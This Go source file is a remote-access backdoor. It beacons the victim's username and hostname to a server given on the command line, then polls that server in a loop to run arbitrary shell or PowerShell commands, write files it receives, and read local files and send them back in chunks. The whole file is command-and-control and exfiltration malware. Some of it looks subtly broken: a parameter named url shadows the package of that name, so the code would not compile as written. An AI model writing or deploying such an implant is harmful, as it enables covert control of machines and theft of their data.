package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var D = 10
var N = 50000
var X = "utf-8"

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-Command", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

func sendGetRequest(url string, params map[string]string) (string, error) {
	queryParams := url.Values{}
	for key, value := range params {
		queryParams.Add(key, value)
	}
	fullURL := fmt.Sprintf("%s?%s", url, queryParams.Encode())

	response, err := http.Get(fullURL)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func sendPostRequest(url string, data map[string]string) (string, error) {
	formData := url.Values{}
	for key, value := range data {
		formData.Add(key, value)
	}

	response, err := http.PostForm(url, formData)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	srv := flag.String("srv", "", "Server URL")
	flag.Parse()

	if *srv == "" {
		fmt.Println("Server URL not provided.")
		os.Exit(1)
	}

	for {
		s_i := 0

		// Get user and hostname information
		currentUser, err := user.Current()
		if err != nil {
			fmt.Println("Failed to get current user:", err)
			os.Exit(1)
		}
		hostname, err := os.Hostname()
		if err != nil {
			fmt.Println("Failed to get hostname:", err)
			os.Exit(1)
		}
		userInfo := base64.StdEncoding.EncodeToString([]byte(currentUser.Username + "|" + hostname))

		// Send GET request to server
		u, err := sendGetRequest(*srv, map[string]string{"i": userInfo})
		if err != nil {
			fmt.Println("Failed to send GET request:", err)
			time.Sleep(time.Duration(D) * time.Second)
			continue
		}

		for {
			b := []string{}
			s_i = (s_i + 1) % len(*srv)

			// Wait for data from server
			for {
				data, err := sendGetRequest(*srv, map[string]string{"u": u})
				if err != nil {
					fmt.Println("Failed to send GET request:", err)
					time.Sleep(time.Duration(D) * time.Second)
					continue
				}
				if data != "" {
					break
				}
				time.Sleep(time.Duration(D) * time.Second)
			}

			// Collect all data from server
			for {
				data, err := sendGetRequest(*srv, map[string]string{"u": u})
				if err != nil {
					fmt.Println("Failed to send GET request:", err)
					time.Sleep(time.Duration(D) * time.Second)
					continue
				}
				if data == "" {
					break
				}
				b = append(b, data)
			}

			var r string
			if b[0][0] == '0' {
				// Execute command received from the server
				command, err := base64.StdEncoding.DecodeString(strings.Split(strings.Join(b, ""), "|")[1])
				if err != nil {
					fmt.Println("Failed to decode command:", err)
					continue
				}
				result, err := executeCommand(string(command))
				if err != nil {
					fmt.Println("Failed to execute command:", err)
					continue
				}
				r = base64.StdEncoding.EncodeToString([]byte(result))
			} else if b[0][0] == '1' {
				// Write received file content to a file
				filePath, err := base64.StdEncoding.DecodeString(strings.Split(b[0], "|")[1])
				if err != nil {
					fmt.Println("Failed to decode file path:", err)
					continue
				}
				fileContent, err := base64.StdEncoding.DecodeString(strings.Join(b[1:], ""))
				if err != nil {
					fmt.Println("Failed to decode file content:", err)
					continue
				}
				err = ioutil.WriteFile(string(filePath), fileContent, 0644)
				if err != nil {
					fmt.Println("Failed to write file:", err)
					r = base64.StdEncoding.EncodeToString([]byte(err.Error()))
				} else {
					r = "ok"
				}
			} else if b[0][0] == '2' {
				// Read file content and send it back to the server
				filePath, err := base64.StdEncoding.DecodeString(strings.Split(b[0], "|")[1])
				if err != nil {
					fmt.Println("Failed to decode file path:", err)
					continue
				}
				fileContent, err := ioutil.ReadFile(string(filePath))
				if err != nil {
					fmt.Println("Failed to read file:", err)
					r = base64.StdEncoding.EncodeToString([]byte(err.Error()))
				} else {
					r = base64.StdEncoding.EncodeToString(fileContent)
				}
			}

			// Send result back to the server in chunks
			for i := 0; i < len(r); i += N {
				end := i + N
				if end > len(r) {
					end = len(r)
				}
				_, err := sendPostRequest(*srv, map[string]string{"u": u, "d": r[i:end]})
				if err != nil {
					fmt.Println("Failed to send POST request:", err)
					time.Sleep(time.Duration(D) * time.Second)
					continue
				}
			}

			// Send an empty POST request to signal the end of data
			_, err = sendPostRequest(*srv, map[string]string{"u": u, "d": ""})
			if err != nil {
				fmt.Println("Failed to send POST request:", err)
				time.Sleep(time.Duration(D) * time.Second)
				continue
			}
		}
	}
}
